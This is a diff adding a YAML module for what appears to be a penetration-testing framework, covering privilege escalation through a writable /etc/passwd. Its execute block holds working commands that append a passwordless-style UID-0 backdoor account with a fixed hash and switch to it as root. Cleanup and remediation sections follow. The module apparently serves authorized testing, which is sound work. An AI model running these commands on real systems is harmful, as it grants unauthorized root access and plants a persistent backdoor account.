@@ -1,0 +1,36 @@
+# Writable /etc/passwd → inject UID-0 account
+technique: T1548.001
+name: writable /etc/passwd → UID-0 account injection
+key: privesc:writable-passwd
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: loud
+detect:
+  facts_match: {writable_passwd: true}
+execute:
+  command: |-
+    # openssl-generated password hash for 'fk' — swap for your own in a
+    # real engagement. UID 0 + GID 0 means the next 'su fk' lands as root.
+    h='$1$fk$ZcqTv/l5Z/sYyyyFz7E0R/'
+    echo "fk:$h:0:0:fk:/root:/bin/bash" >> /etc/passwd
+    su -c 'id' fk <<< 'fk' 2>/dev/null
+verify:
+  success: "uid=0"
+cleanup:
+  command: "sed -i '/^fk:/d' /etc/passwd"
+report:
+  vector_type: writable_passwd
+  evidence: "/etc/passwd is writable by the foothold user"
+  description: >
+    Writing a UID-0 line to ``/etc/passwd`` creates a root-equivalent
+    account. On systems without shadow enforcement (or where the shadow
+    file is also writable) ``su`` to the new account lands as root.
+    Still happens on hardened appliances / NAS boxes with permissive
+    defaults.
+  remediation: >
+    ``/etc/passwd`` must be root-owned, 0644 (readable by all, writable
+    only by root). ``chattr +i`` is a defensive hardening on appliances.
+  refs: [T1548.001]
